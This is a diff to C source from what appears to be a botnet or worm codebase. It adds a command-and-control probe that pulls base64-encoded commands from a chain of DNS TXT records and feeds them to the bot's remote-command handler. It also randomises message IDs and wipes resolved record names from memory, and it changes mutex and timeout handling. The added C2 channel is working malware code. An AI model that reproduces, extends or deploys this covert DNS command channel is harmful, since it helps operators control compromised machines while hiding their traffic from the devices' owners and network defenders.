@@ -16,6 +16,8 @@
 #include <sys/wait.h>
 #include <sys/ioctl.h>
 
+#include <mbedtls/base64.h>
+
 // Hover Max Redirection count
 #define HTBT_HOVER_MAX_REDIR	5
 // CNCP interval: HTBT_CNCP_INT_MIN + variance
@@ -26,6 +28,9 @@
 #define HTBT_CNCP_INT_VAR		2000
 #define HTBT_LBD_PORT			prne_htobe16(PRNE_HTBT_PROTO_PORT)
 #define HTBT_LBD_BACKLOG		4
+
+// CNCP TXT Record Data Transfer Timeout
+static const struct timespec HTBT_CNCP_STREAM_TIMEOUT = { 1800, 0 }; // 30m
 // Slave Socket Operation Timeout
 static const struct timespec HTBT_SLV_SCK_OP_TIMEOUT = { 10, 0 }; // 10s
 // Slave Status Send Timeout
@@ -45,9 +50,9 @@ typedef struct {
 	bool (*loopchk_f)(void *ioctx);
 	bool (*setup_f)(void *ioctx, pth_event_t ev);
 	void (*cleanup_f)(void *ioctx, pth_event_t ev);
-	int (*read_f)(void *ioctx, void *buf, const size_t len);
-	int (*write_f)(void *ioctx, const void *buf, const size_t len);
-	void (*hover_f)( // TODO: assign
+	ssize_t (*read_f)(void *ioctx, void *buf, const size_t len);
+	ssize_t (*write_f)(void *ioctx, const void *buf, const size_t len);
+	void (*hover_f)(
 		void *ioctx,
 		const prne_htbt_hover_t *hv,
 		prne_htbt_status_code_t *status,
@@ -58,6 +63,13 @@ typedef struct {
 	prne_pth_cv_t cv;
 	bool valid;
 } htbt_slv_ctx_t;
+
+typedef struct {
+	prne_htbt_t *parent;
+	pth_t pth;
+	int fd[2];
+	htbt_slv_ctx_t slv;
+} htbt_cncp_client_t;
 
 typedef struct {
 	pth_t pth;
@@ -102,6 +114,7 @@ struct prne_htbt {
 		pth_cond_t cond;
 	} main;
 	struct { // CNC DNS Record Probe
+		char txtrec[256];
 		pth_t pth;
 		pth_mutex_t lock;
 		pth_cond_t cond;
@@ -147,10 +160,10 @@ static bool htbt_main_q_req_slip (prne_htbt_t *ctx, htbt_req_slip_t *in) {
 	}
 	htbt_init_req_slip(ny_slip);
 
-	prne_assert(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
+	prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
 	alloc = prne_llist_append(&ctx->main.req_q, ny_slip) != NULL;
 	if (alloc) {
-		pth_cond_notify(&ctx->main.cond, FALSE);
+		prne_dbgtrap(pth_cond_notify(&ctx->main.cond, FALSE));
 	}
 	pth_mutex_release(&ctx->main.lock);
 	if (alloc) {
@@ -205,7 +218,7 @@ static bool htbt_main_q_hover (
 	htbt_init_hv_req_body(body);
 	body->parent = ctx;
 	if (trace == NULL) {
-		prne_assert(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
+		prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
 		ny_trace = prne_llist_append(&ctx->main.hover_req, (void*)1);
 		pth_mutex_release(&ctx->main.lock);
 		if (ny_trace == NULL) {
@@ -228,7 +241,7 @@ static bool htbt_main_q_hover (
 	ret = true;
 END:
 	if (ny_trace != NULL) {
-		prne_assert(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
+		prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
 		prne_llist_append(&ctx->main.hover_req, ny_trace);
 		pth_mutex_release(&ctx->main.lock);
 	}
@@ -1243,6 +1256,8 @@ static bool htbt_slv_consume_inbuf (
 	bool ret = true;
 
 	while (ret && ctx->valid) {
+		htbt_slv_skip_inbuf(ctx);
+
 		prne_htbt_free_msg_head(&f_head);
 		prne_htbt_init_msg_head(&f_head);
 
@@ -1288,8 +1303,6 @@ static bool htbt_slv_consume_inbuf (
 			htbt_slv_raise_protoerr(ctx, f_head.id, PRNE_HTBT_STATUS_UNIMPL);
 			goto END;
 		}
-
-		htbt_slv_skip_inbuf(ctx);
 	}
 
 END:
@@ -1311,6 +1324,8 @@ static void *htbt_slv_entry (void *p) {
 	if (!ctx->setup_f(ctx->ioctx, ev_timeout)) {
 		goto END;
 	}
+	pth_event_free(ev_timeout, FALSE);
+	ev_timeout = NULL;
 
 	pfd[0].fd = ctx->fd[0];
 	pfd[1].fd = ctx->fd[1];
@@ -1321,8 +1336,8 @@ static void *htbt_slv_entry (void *p) {
 				prne_pth_tstimeout(HTBT_SLV_SCK_OP_TIMEOUT));
 			prne_assert(ev_timeout != NULL);
 		}
-		pth_event_free(ev_root, FALSE);
 
+		pth_event_free(ev_root, FALSE);
 		if (ctx->iobuf[1].len > 0) {
 			pfd[0].events = 0;
 			pfd[1].events = POLLOUT;
@@ -1340,12 +1355,9 @@ static void *htbt_slv_entry (void *p) {
 		prne_assert(ev_root != NULL);
 		pth_event_concat(ev_root, ev_timeout, NULL);
 
-		prne_assert(pth_mutex_acquire(ctx->cv.lock, FALSE, ev_timeout));
-		pth_cond_await(ctx->cv.cond, ctx->cv.lock, ev_timeout);
+		prne_dbgtrap(pth_mutex_acquire(ctx->cv.lock, FALSE, NULL));
+		pth_cond_await(ctx->cv.cond, ctx->cv.lock, ev_root);
 		pth_mutex_release(ctx->cv.lock);
-		if (pth_event_status(ev_timeout) == PTH_STATUS_OCCURRED) {
-			break;
-		}
 
 		f_ret = poll(pfd, 2, 0);
 		if (f_ret < 0 && errno != EINTR) {
@@ -1355,6 +1367,12 @@ static void *htbt_slv_entry (void *p) {
 			break;
 		}
 		else {
+			pth_event_free(ev_timeout, FALSE);
+			ev_timeout = pth_event(
+				PTH_EVENT_TIME,
+				prne_pth_tstimeout(HTBT_SLV_SCK_OP_TIMEOUT));
+			prne_assert(ev_timeout != NULL);
+
 			if (pfd[1].revents & POLLOUT) {
 				htbt_slv_consume_outbuf(ctx, 0, ev_timeout);
 			}
@@ -1460,7 +1478,7 @@ ERR:
 		pfd[i].fd = -1;
 	}
 
-	prne_assert(pth_mutex_acquire(&ctx->lock, FALSE, ev_root));
+	prne_dbgtrap(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
 	if (ctx->loop_flag) {
 		pth_cond_await(&ctx->cond, &ctx->lock, ev_root);
 	}
@@ -1506,7 +1524,16 @@ static bool htbt_main_slv_setup_f (void *ioctx, pth_event_t ev) {
 	prne_htbt_msg_head_t mh;
 
 	prne_htbt_init_msg_head(&mh);
-	mh.id = 1;
+	if (mbedtls_ctr_drbg_random(
+		ctx->parent->param.ctr_drbg,
+		(unsigned char *)&mh.id,
+		sizeof(mh.id) == 0))
+	{
+		mh.id = (mh.id % PRNE_HTBT_MSG_ID_DELTA) + PRNE_HTBT_MSG_ID_MIN;
+	}
+	else {
+		mh.id = PRNE_HTBT_MSG_ID_MIN;
+	}
 	mh.is_rsp = false;
 	mh.op = PRNE_HTBT_OP_SOLICIT;
 	prne_htbt_ser_msg_head(NULL, 0, &actual, &mh);
@@ -1544,12 +1571,16 @@ static void htbt_main_slv_cleanup_f (void *ioctx, pth_event_t ev) {
 		ev);
 }
 
-static int htbt_main_slv_read_f (void *ioctx, void *buf, const size_t len) {
+static ssize_t htbt_main_slv_read_f (
+	void *ioctx,
+	void *buf,
+	const size_t len)
+{
 	htbt_main_client_t *ctx = (htbt_main_client_t*)ioctx;
 	return mbedtls_ssl_read(&ctx->ssl, (unsigned char*)buf, len);
 }
 
-static int htbt_main_slv_write_f (
+static ssize_t htbt_main_slv_write_f (
 	void *ioctx,
 	const void *buf,
 	const size_t len)
@@ -1637,7 +1668,7 @@ static void htbt_main_srv_hover (
 	htbt_slv_entry(&c.slv);
 
 	if (!c.hv_used) {
-		prne_assert(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
+		prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
 		prne_llist_erase(&ctx->main.hover_req, c.hv_trace);
 		pth_mutex_release(&ctx->main.lock);
 	}
@@ -1656,7 +1687,7 @@ static void *htbt_main_entry (void *p) {
 	prne_assert(pth_resume(ctx->cncp.pth));
 
 	while (ctx->loop_flag) {
-		prne_assert(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
+		prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
 		if (ctx->main.req_q.head == NULL) {
 			pth_cond_await(&ctx->main.cond, &ctx->main.lock, NULL);
 		}
@@ -1702,45 +1733,307 @@ FREE:
 	return NULL;
 }
 
-static void htbt_cncp_do_probe (prne_htbt_t *ctx) {
-	prne_resolv_prm_t prm;
-	bool r_ret;
-	prne_pth_cv_t cv;
-	char txtrec[256];
-
-	prne_resolv_init_prm(&prm);
-	cv.lock = &ctx->lock;
-	cv.cond = &ctx->cond;
-	cv.broadcast = false;
-
-	if (!ctx->param.cb_f.cnc_txtrec(txtrec)) {
-		goto END;
-	}
-	txtrec[255] = 0;
-	r_ret = prne_resolv_prm_gettxtrec(
-		ctx->param.resolv,
-		txtrec,
-		&cv,
-		&prm);
-	if (!r_ret) {
-		goto END;
+static void htbt_cncp_scrub_names (prne_resolv_fut_t *fut) {
+	if (fut == NULL) {
+		return;
 	}
 
-	prne_assert(pth_mutex_acquire(cv.lock, FALSE, NULL));
-	pth_cond_await(cv.cond, cv.lock, NULL); // Will be notified by resolv.
-	pth_mutex_release(cv.lock);
+	for (size_t i = 0; i < fut->rr_cnt; i += 1) {
+		prne_memzero(fut->rr[i].name, prne_nstrlen(fut->rr[i].name));
+	}
+}
 
-	if (prm.fut->qr == PRNE_RESOLV_QR_OK && prm.fut->rr_cnt > 0) {
-		// Scrub off the name
-		for (size_t i = 0; i < prm.fut->rr_cnt; i += 1) {
-			prne_memzero(prm.fut->rr[i].name, strlen(prm.fut->rr[i].name));
+static bool htbt_cncp_slv_loopchk_f (void *ioctx) {
+	htbt_cncp_client_t *ctx = (htbt_cncp_client_t*)ioctx;
+	return ctx->parent->loop_flag;
+}
+
+static bool htbt_cncp_slv_setup_f (void *ioctx, pth_event_t ev) {
+	return true;
+}
+
+static void htbt_cncp_slv_cleanup_f (void *ioctx, pth_event_t ev) {
+	htbt_cncp_client_t *ctx = (htbt_cncp_client_t*)ioctx;
+
+	close(ctx->fd[0]);
+	ctx->fd[0] = -1;
+}
+
+static ssize_t htbt_cncp_slv_read_f (
+	void *ioctx,
+	void *buf,
+	const size_t len)
+{
+	htbt_cncp_client_t *ctx = (htbt_cncp_client_t*)ioctx;
+	return read(ctx->fd[0], buf, len);
+}
+
+static ssize_t htbt_cncp_slv_write_f (
+	void *ioctx,
+	const void *buf,
+	const size_t len)
+{
+	return len;
+}
+
+static void htbt_cncp_slv_hover_f (
+	void *ioctx,
+	const prne_htbt_hover_t *hv,
+	prne_htbt_status_code_t *status,
+	int32_t *err)
+{
+	htbt_cncp_client_t *ctx = (htbt_cncp_client_t*)ioctx;
+
+	// Ignore HTBT_HOVER_MAX_REDIR
+	if (htbt_main_q_hover(ctx->parent, hv, NULL)) {
+		*status = PRNE_HTBT_STATUS_OK;
+		*err = 0;
+	}
+	else {
+		*status = PRNE_HTBT_STATUS_ERRNO;
+		*err = errno;
+	}
+}
+
+static void htbt_cncp_stream_slv (
+	prne_htbt_t *ctx,
+	prne_resolv_prm_t *prm,
+	prne_pth_cv_t *cv,
+	const uint_fast32_t len)
+{
+	pth_event_t ev = NULL, ev_time;
+	htbt_cncp_client_t c;
+	uint8_t m_buf[189];
+	prne_iobuf_t trio;
+	size_t declen;
+
+	prne_init_iobuf(&trio);
+	prne_iobuf_setextbuf(&trio, m_buf, sizeof(m_buf), 0);
+	ev_time = pth_event(
+		PTH_EVENT_TIME,
+		prne_pth_tstimeout(HTBT_CNCP_STREAM_TIMEOUT));
+	prne_assert(ev_time != NULL);
+
+	c.parent = ctx;
+	c.pth = NULL;
+	c.fd[0] = c.fd[1] = -1;
+	htbt_init_slv_ctx(&c.slv);
+
+	if (pipe(c.fd) != 0 ||
+		!prne_sck_fcntl(c.fd[0]) ||
+		!prne_sck_fcntl(c.fd[1]))
+	{
+		prne_dbgperr("CNCP slave input channel");
+		goto END;
+	}
+
+	c.slv.fd[0] = c.fd[0];
+	c.slv.fd[1] = ctx->param.blackhole;
+	c.slv.ioctx = &c;
+	c.slv.loopchk_f = htbt_cncp_slv_loopchk_f;
+	c.slv.setup_f = htbt_cncp_slv_setup_f;
+	c.slv.cleanup_f = htbt_cncp_slv_cleanup_f;
+	c.slv.read_f = htbt_cncp_slv_read_f;
+	c.slv.write_f = htbt_cncp_slv_write_f;
+	c.slv.hover_f = htbt_cncp_slv_hover_f;
+	c.slv.cbset = &ctx->param.cb_f;
+	if (!htbt_alloc_slv_iobuf(&c.slv)) {
+		prne_dbgperr("htbt_alloc_slv_iobuf()@CNCP");
+		goto END;
+	}
+	c.slv.cv.lock = &ctx->lock;
+	c.slv.cv.cond = &ctx->cond;
+
+	c.pth = pth_spawn(PTH_ATTR_DEFAULT, htbt_slv_entry, &c.slv);
+	if (c.pth == NULL) {
+		prne_dbgperr("pth_spawn()@CNCP");
+		goto END;
+	}
+
+	for (uint_fast32_t i = 0; i < len; ) {
+		prne_hex_tochar(prne_getmsb32(i, 0), ctx->cncp.txtrec + 0, true);
+		prne_hex_tochar(prne_getmsb32(i, 1), ctx->cncp.txtrec + 2, true);
+		prne_hex_tochar(prne_getmsb32(i, 2), ctx->cncp.txtrec + 4, true);
+		prne_hex_tochar(prne_getmsb32(i, 3), ctx->cncp.txtrec + 6, true);
+
+		if (!prne_resolv_prm_gettxtrec(
+			ctx->param.resolv,
+			ctx->cncp.txtrec,
+			cv,
+			prm))
+		{
+			prne_dbgperr("prne_resolv_prm_gettxtrec()@CNCP");
+			goto END;
 		}
-		// TODO
-		// <entries in hex> <txt rec name suffix>
+
+		prne_dbgtrap(pth_mutex_acquire(cv->lock, FALSE, NULL));
+		if (ctx->loop_flag) {
+			// Will be notified by resolv or fin() caller
+			pth_cond_await(cv->cond, cv->lock, ev_time);
+		}
+		pth_mutex_release(cv->lock);
+		if (!ctx->loop_flag ||
+			pth_event_status(ev_time) == PTH_STATUS_OCCURRED)
+		{
+			goto END;
+		}
+
+		htbt_cncp_scrub_names(prm->fut);
+		if (prm->fut->qr == PRNE_RESOLV_QR_OK) {
+			int f_ret;
+
+			if (prm->fut->rr_cnt != 1) {
+				prne_dbgpf(
+					"%s: invalid number of TXT record\n",
+					ctx->cncp.txtrec);
+				goto END;
+			}
+
+			f_ret = mbedtls_base64_decode(
+				trio.m + trio.len,
+				trio.avail,
+				&declen,
+				prm->fut->rr[0].rd_data + 1,
+				prm->fut->rr[0].rd_data[0]);
+			if (f_ret < 0) {
+				prne_dbgpf("* mbedtls_base64_decode()@CNCP: %d\n", f_ret);
+				goto END;
+			}
+			prne_iobuf_shift(&trio, declen);
+
+			while (trio.len > 0 && ctx->loop_flag) {
+				pth_event_free(ev, FALSE);
+				ev = pth_event(
+					PTH_EVENT_FD |
+						PTH_UNTIL_FD_WRITEABLE |
+						PTH_UNTIL_FD_EXCEPTION,
+					c.fd[1]);
+				prne_assert(ev != NULL);
+
+				prne_dbgtrap(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
+				if (ctx->loop_flag) {
+					pth_cond_await(&ctx->cond, &ctx->lock, ev);
+				}
+				pth_mutex_release(&ctx->lock);
+
+				f_ret = write(c.fd[1], trio.m, trio.len);
+				if (f_ret == 0 ||
+					(f_ret < 0 &&
+					(errno != EWOULDBLOCK && errno != EAGAIN)))
+				{
+					goto END;
+				}
+				prne_iobuf_shift(&trio, -f_ret);
+			}
+
+			i += 1;
+		}
 	}
 
 END:
-	prne_memzero(txtrec, sizeof(txtrec));
+	prne_close(c.fd[1]);
+	if (c.pth != NULL) {
+		pth_join(c.pth, NULL);
+	}
+
+	pth_event_free(ev, FALSE);
+	pth_event_free(ev_time, FALSE);
+	prne_close(c.fd[0]);
+	htbt_free_slv_ctx(&c.slv);
+	prne_free_iobuf(&trio);
+}
+
+static void htbt_cncp_do_probe (prne_htbt_t *ctx) {
+	prne_resolv_prm_t prm;
+	prne_pth_cv_t cv;
+
+	prne_resolv_init_prm(&prm);
+	cv.lock = &ctx->cncp.lock;
+	cv.cond = &ctx->cncp.cond;
+	cv.broadcast = false;
+
+	if (!ctx->param.cb_f.cnc_txtrec(ctx->cncp.txtrec)) {
+		goto END;
+	}
+	ctx->cncp.txtrec[255] = 0;
+	{
+		const bool q_ret = prne_resolv_prm_gettxtrec(
+			ctx->param.resolv,
+			ctx->cncp.txtrec,
+			&cv,
+			&prm);
+		prne_memzero(ctx->cncp.txtrec, sizeof(ctx->cncp.txtrec));
+		if (!q_ret) {
+			prne_dbgperr("prne_resolv_prm_gettxtrec()");
+			goto END;
+		}
+	}
+
+	prne_dbgtrap(pth_mutex_acquire(cv.lock, FALSE, NULL));
+	if (ctx->loop_flag) {
+		// Will be notified by resolv or fin() caller
+		pth_cond_await(cv.cond, cv.lock, NULL);
+	}
+	pth_mutex_release(cv.lock);
+	if (!ctx->loop_flag) {
+		goto END;
+	}
+
+	if (prm.fut->qr == PRNE_RESOLV_QR_OK && prm.fut->rr_cnt > 0) {
+		uint8_t len[4];
+
+		htbt_cncp_scrub_names(prm.fut);
+		{
+			size_t idx;
+			prne_resolv_rr_t *rr;
+			size_t prefix_len;
+
+			// Use whichever head (load balancing)
+			if (mbedtls_ctr_drbg_random(
+				ctx->param.ctr_drbg,
+				(unsigned char *)&idx,
+				sizeof(idx)) == 0)
+			{
+				idx = idx % prm.fut->rr_cnt;
+			}
+			else {
+				idx = 0;
+			}
+			rr = prm.fut->rr + idx;
+
+			// <uint32_t number of entries in hex> <txt rec name suffix>
+			// Parse header
+			if (rr->rd_data[0] < 9) {
+				prne_dbgpf("* TXTREC format error: insufficient length\n");
+				goto END;
+			}
+			if (!prne_hex_fromstr((char*)rr->rd_data + 1, len + 0) ||
+				!prne_hex_fromstr((char*)rr->rd_data + 3, len + 1) ||
+				!prne_hex_fromstr((char*)rr->rd_data + 5, len + 2) ||
+				!prne_hex_fromstr((char*)rr->rd_data + 7, len + 3))
+			{
+				prne_dbgpf("* TXTREC format error: invalid length string\n");
+				goto END;
+			}
+			prefix_len = rr->rd_data[0] - 8;
+			memcpy(ctx->cncp.txtrec + 8, rr->rd_data + 9, prefix_len);
+			ctx->cncp.txtrec[8 + prefix_len] = 0;
+		}
+
+		htbt_cncp_stream_slv(
+			ctx,
+			&prm,
+			&cv,
+			prne_recmb_msb32(len[0], len[1], len[2], len[3]));
+	}
+	else {
+		prne_dbgpf(
+			"* TXTREC resolv error: %s\n",
+			prne_resolv_qr_tostr(prm.fut->qr));
+	}
+
+END:
+	prne_memzero(ctx->cncp.txtrec, sizeof(ctx->cncp.txtrec));
 	prne_resolv_free_prm(&prm);
 }
 
@@ -1766,7 +2059,7 @@ static void *htbt_cncp_entry (void *p) {
 
 		// wait
 		prne_assert(ev != NULL); // fatal without timeout
-		prne_assert(pth_mutex_acquire(&ctx->cncp.lock, FALSE, NULL));
+		prne_dbgtrap(pth_mutex_acquire(&ctx->cncp.lock, FALSE, NULL));
 		if (ctx->loop_flag) {
 			pth_cond_await(&ctx->cncp.cond, &ctx->cncp.lock, ev);
 		}
@@ -1799,12 +2092,20 @@ static void htbt_lbd_slv_cleanup_f (void *ioctx, pth_event_t ev) {
 	prne_shutdown(ctx->fd, SHUT_RDWR);
 }
 
-static int htbt_lbd_slv_read_f (void *ioctx, void *buf, const size_t len) {
+static ssize_t htbt_lbd_slv_read_f (
+	void *ioctx,
+	void *buf,
+	const size_t len)
+{
 	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
 	return mbedtls_ssl_read(&ctx->ssl, (unsigned char*)buf, len);
 }
 
-static int htbt_lbd_slv_write_f (void *ioctx, const void *buf, const size_t len) {
+static ssize_t htbt_lbd_slv_write_f (
+	void *ioctx,
+	const void *buf,
+	const size_t len)
+{
 	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
 	return mbedtls_ssl_write(&ctx->ssl, (const unsigned char*)buf, len);
 }
@@ -1947,7 +2248,7 @@ ERR:
 			PTH_EVENT_TIME,
 			prne_pth_tstimeout(HTBT_LBD_BIND_INT));
 
-		prne_assert(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
+		prne_dbgtrap(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
 		if (ctx->loop_flag) {
 			pth_cond_await(&ctx->cond, &ctx->lock, ev);
 		}
@@ -2001,7 +2302,7 @@ static void htbt_lbd_serve_loop (prne_htbt_t *ctx) {
 			ent = ent->next;
 		}
 
-		prne_assert(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
+		prne_dbgtrap(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
 		if (ctx->loop_flag) {
 			pth_cond_await(&ctx->cond, &ctx->lock, ev);
 		}
@@ -2132,7 +2433,8 @@ prne_htbt_t *prne_alloc_htbt (
 		param.cncp_ssl_conf == NULL ||
 		param.main_ssl_conf == NULL ||
 		param.ctr_drbg == NULL ||
-		param.resolv == NULL)
+		param.resolv == NULL ||
+		param.blackhole < 0)
 	{
 		errno = EINVAL;
 		goto ERR;
@@ -2191,6 +2493,7 @@ ERR:
 
 void prne_htbt_init_param (prne_htbt_param_t *p) {
 	prne_memzero(p, sizeof(prne_htbt_param_t));
+	p->blackhole = -1;
 }
 
 void prne_htbt_free_param (prne_htbt_param_t *p) {}
